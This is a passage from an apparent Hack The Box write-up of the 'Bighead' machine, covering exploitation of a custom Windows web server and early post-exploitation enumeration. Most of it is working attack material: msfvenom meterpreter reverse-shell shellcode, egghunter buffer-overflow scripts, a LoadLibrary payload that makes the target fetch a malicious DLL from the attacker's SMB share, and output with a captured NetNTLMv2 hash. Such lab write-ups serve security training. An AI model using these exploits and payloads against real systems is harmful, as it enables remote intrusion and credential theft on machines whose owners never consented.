<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xfa\xc4\x92\x74\x7a\x38\x62\x76\xab\xef\xf9\x21\x6b</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x11\x2e\x5a\x22\x09\x33\x67\xfc\xa2\x87\x13\xff\x62</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xd6\xdc\xac\x4a\xd7\x2e\xac\x8b\xdf\xd0\xdb\xe5\x1c</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x6c\xdc\x31\x5f\xaa\x69\xa2\xc7\x39\xc9\x0e\xf6\xee</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8c\xc5\xf4\x5b\xda\x82\x18\x5d\x0f\xb9\x24\xd6\xae</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x6e\xad\xac\x94\xaa\xf6\x77\xb4\xeb\x52\xd9\xc9\xec</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x3d\x86\x6f\x66\xd3\xd3\x1d\x25\xbb\x10\x2c\xd6\x3b</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x3f\x27\xa5\x09\xe0\x93\x21\x21\x69\x3a\xb5\x30\x7d</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbd\x69\xfa\xee\x43\x8a\xfa\x27\x80\xde\xaa\x5f\x21</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5f\x21\xa0\xce\x8a\xdf\xaa\x58\x99\x08\xa1\xbf\x89</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x34\xb5\xbf\x19\xb1\x53\xef\xc9\x91\xcb\x50\xba\x51</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbc\x38\xd0\x5e\xe3\x59\xdb\xb5\x8c\xf0\x34\x63\xe4</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x6c\xac\x2e\x7e\x0c\x31\xe5\xfa\x0e\xb9\x0f\xfa\xc1</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x4a\x7a\xe8\x36\x2d\x84\xf0\xc6\xd8\x84\x9a\xc2\x4a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xd3\x32\xc9\xab\x13\x9d\x32\x9e\x20\xda\xcd\x5f\x10</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\xf8\xf5\x1c\xce\x04\x1a\x9c\x0e\x53\x70\x9c\x66</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x03\x20\xcf\x93\x4c\xfd\x7c\x08\xd9\xfe\xd4\xfc\x4a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x97\xda\xdb\xbd\x38\x25\x0e\xbe\x3f\xd9\xcc\xe9\xe7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb1\x2e\xaa\x17\x41\x45\x2a\x48\x29\x92\x05\x67\x99</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5b\x8c\x20\xb1\xd6\x41\x82\x20\xe6\x4b\x42\xfc\xe7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x78\x5f\x0f\x9d\xf1\x60\xf0\x62\x18\x05\xf1\x62\x24</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x3b\xce\xb4\x1d\x49\x11\x05\x1a\x42\x24\x28\x0b\xc9</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x46\x7e\x4b\xd8</span><span class="s">"</span>

<span class="n">stage1</span> <span class="o">=</span> <span class="s">"POST /coffee HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">stage1</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.23.10.186'</span><span class="p">,</span> <span class="mi">8008</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">stage1</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.23.10.186'</span><span class="p">,</span> <span class="mi">8008</span><span class="p">)</span>
<span class="n">jmp_eax</span> <span class="o">=</span> <span class="s">"f2125062"</span>
<span class="n">align_esp</span> <span class="o">=</span> <span class="s">"505C"</span> <span class="c1"># push eax, pop esp
</span><span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"</span>
<span class="n">stage2</span> <span class="o">=</span> <span class="n">align_esp</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">"9090"</span> <span class="o">+</span> <span class="n">jmp_eax</span>

<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="n">stage2</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: dev.bighead.htb</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>When the egghunter is scanning memory, CPU usage goes to 100% for a few seconds.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/cpu.png" alt="" /></p>

<p>When it hits the egg, it executes the meterpreter stager and we get a connection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 172.23.10.186
[*] Meterpreter session 1 opened (172.23.10.39:80 -&gt; 172.23.10.186:49804) at 2019-05-03 19:37:47 -0400

msf5 exploit(multi/handler) &gt; sessions 1
[*] Starting interaction with 1...
</code></pre></div></div>

<p>Nice, the exploit works locally.</p>

<p>But when I tried running it against Bighead it didn’t work so I replicated the nginx setup locally in Win7 and found that the second stage shellcode was being URL encoded by nginx. To work around this I had to fix the POST request and remove the <code class="language-plaintext highlighter-rouge">Content-Type</code> header so it would not URL encode the payload then switch the content body to the raw shellcode (non URL-encoded).</p>

<p>The final exploit looks like this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="s">'''
# msfvenom -p windows/meterpreter/reverse_tcp -b </span><span class="se">\x00\x0a\x0d</span><span class="s"> -f python LHOST=10.10.14.23 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
'''</span>

<span class="n">egg</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x77\x30\x30\x74</span><span class="s">"</span> <span class="c1"># w00t
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egg</span> <span class="o">+</span> <span class="n">egg</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb8\xc3\x06\x6e\xa1\xd9\xcd\xd9\x74\x24\xf4\x5f\x2b</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\xb1\x56\x83\xef\xfc\x31\x47\x0f\x03\x47\xcc\xe4</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x9b\x5d\x3a\x6a\x63\x9e\xba\x0b\xed\x7b\x8b\x0b\x89</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x08\xbb\xbb\xd9\x5d\x37\x37\x8f\x75\xcc\x35\x18\x79</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x65\xf3\x7e\xb4\x76\xa8\x43\xd7\xf4\xb3\x97\x37\xc5</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7b\xea\x36\x02\x61\x07\x6a\xdb\xed\xba\x9b\x68\xbb</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x06\x17\x22\x2d\x0f\xc4\xf2\x4c\x3e\x5b\x89\x16\xe0</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5d\x5e\x23\xa9\x45\x83\x0e\x63\xfd\x77\xe4\x72\xd7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x46\x05\xd8\x16\x67\xf4\x20\x5e\x4f\xe7\x56\x96\xac</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x9a\x60\x6d\xcf\x40\xe4\x76\x77\x02\x5e\x53\x86\xc7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x39\x10\x84\xac\x4e\x7e\x88\x33\x82\xf4\xb4\xb8\x25</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xdb\x3d\xfa\x01\xff\x66\x58\x2b\xa6\xc2\x0f\x54\xb8</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xad\xf0\xf0\xb2\x43\xe4\x88\x98\x0b\xc9\xa0\x22\xcb</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x45\xb2\x51\xf9\xca\x68\xfe\xb1\x83\xb6\xf9\xc0\x84</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x48\xd5\x6a\xc4\xb6\xd6\x8a\xcc\x7c\x82\xda\x66\x54</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xab\xb1\x76\x59\x7e\x2f\x7d\xcd\x8b\xa5\x8f\x1a\xe4</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xbb\x8f\x24\xa4\x32\x69\x74\x14\x14\x26\x35\xc4\xd4</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x96\xdd\x0e\xdb\xc9\xfe\x30\x36\x62\x94\xde\xee\xda</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x46\xab\x91\xb0\x87\x66\xdc\xf3\x0c\x82\x20\xbd</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xe4\xe7\x32\xaa\x92\x07\xcb\x2b\x37\x07\xa1\x2f\x91</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x50\x5d\x32\xc4\x96\xc2\xcd\x23\xa5\x05\x31\xb2\x9f</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7e\x04\x20\x9f\xe8\x69\xa4\x1f\xe9\x3f\xae\x1f\x81</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xe7\x8a\x4c\xb4\xe7\x06\xe1\x65\x72\xa9\x53\xd9\xd5</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc1\x59\x04\x11\x4e\xa2\x63\x21\x89\x5c\xf1\x0e\x32</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x34\x09\x0f\xc2\xc4\x63\x8f\x92\xac\x78\xa0\x1d\x1c</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x80\x6b\x76\x34\x0b\xfa\x34\xa5\x0c\xd7\x99\x7b\x0c</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xd4\x01\x8c\x77\x95\xb6\x6d\x88\xbf\xd2\x6e\x88\xbf</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xe4\x53\x5e\x86\x92\x92\x62\xbd\xad\xa1\xc7\x94\x27</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\x54\xe6\x6d</span><span class="s">"</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"payload"</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span><span class="p">}</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="s">"POST"</span><span class="p">,</span> <span class="s">"http://dev.bighead.htb/coffee/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">prepare</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">payload</span>
<span class="k">del</span> <span class="n">p</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">]</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">ReadTimeout</span><span class="p">:</span>
    <span class="k">pass</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.112"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">jmp_eax</span> <span class="o">=</span> <span class="s">"f2125062"</span>
<span class="n">align_esp</span> <span class="o">=</span> <span class="s">"505C"</span> <span class="c1"># push eax, pop esp
</span><span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"</span>
<span class="n">stage2</span> <span class="o">=</span> <span class="n">align_esp</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">"9090"</span> <span class="o">+</span> <span class="n">jmp_eax</span>

<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="n">stage2</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: dev.bighead.htb</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Launching exploit…</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python exploit.py 
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80

msf5 exploit(multi/handler) &gt; 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 10.10.10.112
[*] Meterpreter session 4 opened (10.10.14.23:80 -&gt; 10.10.10.112:49306) at 2019-05-03 20:47:52 -0400

msf5 exploit(multi/handler) &gt; 
msf5 exploit(multi/handler) &gt; sessions 4
[*] Starting interaction with 4...

meterpreter &gt; getuid
Server username: PIEDPIPER\Nelson
</code></pre></div></div>

<h3 id="exploit-development-method-2-using-loadlibrary-over-smb">Exploit development (Method #2 using LoadLibrary over SMB)</h3>

<p>Instead of using an egghunter, we can also use the <code class="language-plaintext highlighter-rouge">LoadLibrary</code> function to load a remote DLL hosted on our machine through the Impacket SMB server. Using the debugger, I can see that the <code class="language-plaintext highlighter-rouge">LoadLibrary</code> is exported from <code class="language-plaintext highlighter-rouge">bheadsrv.dll</code> at address <code class="language-plaintext highlighter-rouge">0x625070C8</code>.</p>

<p><img src="/assets/images/htb-writeup-bighead/exploit/loadlibrary.png" alt="" /></p>

<p>The function is simple and only expects a single parameter: the filename of the DLL file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
</code></pre></div></div>

<p>The exploit uses the same <code class="language-plaintext highlighter-rouge">JMP EAX</code> gadget to jump to the beginning of the buffer. Then we align the stack, and set <code class="language-plaintext highlighter-rouge">EAX</code> past the buffer and we push it to the stack: this will contain the address of the string of our SMB server. Finally we move the address of <code class="language-plaintext highlighter-rouge">LoadLibrary</code> into <code class="language-plaintext highlighter-rouge">EBX</code> then <code class="language-plaintext highlighter-rouge">CALL EBX</code> to call the function. The filename argument for <code class="language-plaintext highlighter-rouge">LoadLibrary</code> is popped from the stack and the DLL is then loaded.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nasm &gt; add al, 0x28
00000000  0428              add al,0x28

nasm &gt; push eax
00000000  50                push eax

nasm &gt; mov ebx, 0x62501B58
00000000  BB581B5062        mov ebx,0x62501b58

nasm &gt; call ebx
00000000  FFD3              call ebx
</code></pre></div></div>

<p>The final exploit looks like this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">binascii</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.112"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>

<span class="n">load_lib</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">load_lib</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x80\x04\x28</span><span class="s">"</span>         <span class="c1"># add ah, 28h
</span><span class="n">load_lib</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x50</span><span class="s">"</span>                 <span class="c1"># push eax
</span><span class="n">load_lib</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xBB\x58\x1B\x50\x62</span><span class="s">"</span> <span class="c1"># 62501B58 ebx -&gt; LoadLibrary
</span><span class="n">load_lib</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xFF\xD3</span><span class="s">"</span>             <span class="c1"># call ebx
</span>
<span class="n">smb</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\\\\</span><span class="s">10.10.14.23</span><span class="se">\\</span><span class="s">share</span><span class="se">\\</span><span class="s">x.dll"</span>
<span class="n">load_lib</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">load_lib</span><span class="p">)</span>
<span class="n">smb</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">smb</span><span class="p">)</span>

<span class="n">jmp_eax</span> <span class="o">=</span> <span class="s">"f2125062"</span>
<span class="n">align_esp</span> <span class="o">=</span> <span class="s">"505C"</span> <span class="c1"># push eax, pop esp
</span><span class="n">buf</span> <span class="o">=</span>  <span class="n">align_esp</span> <span class="o">+</span> <span class="n">load_lib</span> <span class="o">+</span> <span class="s">"90"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">jmp_eax</span> <span class="o">+</span> <span class="n">smb</span>
<span class="n">head</span> <span class="o">=</span> <span class="s">"HEAD /"</span> <span class="o">+</span> <span class="n">buf</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">head</span> <span class="o">+=</span> <span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">head</span> <span class="o">+=</span> <span class="s">"Connection: close</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">head</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>This makes the server download a .dll from my box and execute it. So I can generate a malicious DLL with msfvenom and have the server fetch it to give me a reverse shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p windows/meterpreter/reverse_tcp -o x.dll -f dll LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of dll file: 5120 bytes
Saved as: x.dll
</code></pre></div></div>

<p>Because the server uses SMB to talk back to us, we’ll start an SMB share with Impacket:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /usr/share/doc/python-impacket/examples/smbserver.py share .
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre></div></div>

<p>Firing up the exploit…</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python smbexploit.py 
191
HEAD /505C042850bb581b5062ffd3909090909090909090909090909090909090909090909090f21250625c5c31302e31302e31342e32335c73686172655c782e646c6c HTTP/1.1
Host: dev.bighead.htb
Connection: close
...
[*] Incoming connection (10.10.10.112,60888)
[*] AUTHENTICATE_MESSAGE (PIEDPIPER\Nelson,PIEDPIPER)
[*] User Nelson\PIEDPIPER authenticated successfully
[*] Nelson::PIEDPIPER:4141414141414141:e8e4ea60eb43ad439299c50c245654ca:010100000000000000f1a060fc85d4017e4c61f17754814500000000010010004f00650051004a00490073005600450002001000730047006b007400540068006f005600030010004f00650051004a00490073005600450004001000730047006b007400540068006f0056000700080000f1a060fc85d40106000400020000000800300030000000000000000000000000200000282e2960465001d017bb89eae52e3c9002f1edefda8c004fd0186e57fb9bd3eb000000000000000000000000
[*] Disconnecting Share(1:IPC$)
...
msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 10.10.10.112
[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.112:60889) at 2018-11-26 21:53:32 -0500

msf exploit(multi/handler) &gt; sessions 1
[*] Starting interaction with 1...

meterpreter &gt; getuid
Server username: PIEDPIPER\Nelson
</code></pre></div></div>

<h3 id="windows-enumeration">Windows enumeration</h3>

<p>Now that I finally have a shell, I tried to get <code class="language-plaintext highlighter-rouge">user.txt</code> but this version is just a troll:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cat /users/nelson/desktop/user.txt

    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.         
  .'_ _   \ |  _ _   \     | ,_|    \ .-.')   /   __  \  |   |  |_ _|         
 / ( ` )   '| ( ' )  |   ,-./  )    / `-' \  | ,_/  \__) |   |  ( ' )         
. (_ o _)  ||(_ o _) /   \  '_ '`)   `-'`"`,-./  )       |   '-(_{;}_)        
|  (_,_)___|| (_,_).' __  &gt; (_)  )   .---. \  '_ '`)     |      (_,_)         
'  \   .---.|  |\ \  |  |(  .  .-'   |   |  &gt; (_)  )  __ | _ _--.   |         
 \  `-'    /|  | \ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |         
  \       / |  |  \    /   |        \|   |  `-'`-'     / (_{;}_)|   |         
   `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'         
          .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.            
          | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \   / _     \           
        ,-./  )    / ,-.|  \ _ \ |  |   |  .'/ ( ` )   ' (`' )/`--'           
        \  '_ '`) ;  \  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).              
         &gt; (_)  ) |  _`,/ \ _/  ||  _( )_  ||  (_,_)___| (_,_). '.            
        (  .  .-' : (  '\_/ \   ;\ (_ o._) /'  \   .---..---.  \  :           
         `-'`-'|___\ `"/  \  ) /  \ (_,_) /  \  `-'    /\    `-'  |           
          |        \'. \_/``".'    \     /    \       /  \       /            
          `--------`  '-----'       `---`      `'-..-'    `-...-'             
                ,---------. .---.  .---.     .-''-.                           
                \          \|   |  |_ _|   .'_ _   \                          
                 `--.  ,---'|   |  ( ' )  / ( ` )   '                         
                    |   \   |   '-(_{;}_). (_ o _)  |                         
                    :_ _:   |      (_,_) |  (_,_)___|                         
                    (_I_)   | _ _--.   | '  \   .---.                         
                   (_(=)_)  |( ' ) |   |  \  `-'    /                         
                    (_I_)   (_{;}_)|   |   \       /                          
                    '---'   '(_,_) '---'    `'-..-'                           
                             .---.  .---.    ____       .-'''-. .---.  .---.  
      .-,                    |   |  |_ _|  .'  __ `.   / _     \|   |  |_ _|  
   ,-.|  \ _                 |   |  ( ' ) /   '  \  \ (`' )/`--'|   |  ( ' )  
   \  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_) 
   _`,/ \ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)  
  (  '\_/ \                  | _ _--.   | .'   _    |.---.  \  :| _ _--.   |  
   `"/  \  )                 |( ' ) |   | |  _( )_  |\    `-'  ||( ' ) |   |  
     \_/``"                  (_{;}_)|   | \ (_ o _) / \       / (_{;}_)|   |  
                             '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'  
</code></pre></div></div>

<p>Doing some enumeration next…</p>

<p>System info:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getuid
Server username: PIEDPIPER\Nelson

meterpreter &gt; sysinfo
Computer        : PIEDPIPER
OS              : Windows 2008 (Build 6002, Service Pack 2).
Architecture    : x86
System Language : en_GB
Domain          : DEVELOPMENT
Logged On Users : 5
Meterpreter     : x86/windows
</code></pre></div></div>

<p>Installed programs:</p>

<p>Notice SSH is installed, 7-Zip and Keepass.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/enum_applications 

[*] Enumerating applications installed on PIEDPIPER

Installed Applications
======================

 Name                                                              Version
 ----                                                              -------
 7-Zip 18.05                                                       18.05
 Bitnami TestLink Module                                           1.9.17-0
 Bitvise SSH Server 7.44 (remove only)                             7.44
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)            1
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB958484)            1
 KeePass Password Safe 2.40                                        2.40
 Microsoft .NET Framework 3.5 SP1                                  3.5.30729
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022         9.0.21022
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161    9.0.30729.6161
 Mozilla Firefox 52.9.0 ESR (x86 en-GB)                            52.9.0
 Notepad++ (32-bit x86)                                            7.5.9
 Oracle VM VirtualBox Guest Additions 5.2.12                       5.2.12.0
 Python 2.7.15                                                     2.7.15150
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2604111)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2736416)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2840629)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2861697)  1
 Update for Microsoft .NET Framework 3.5 SP1 (KB963707)            1
 Update for Microsoft .NET Framework 4.5.2 (KB4040977)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4096495)             1
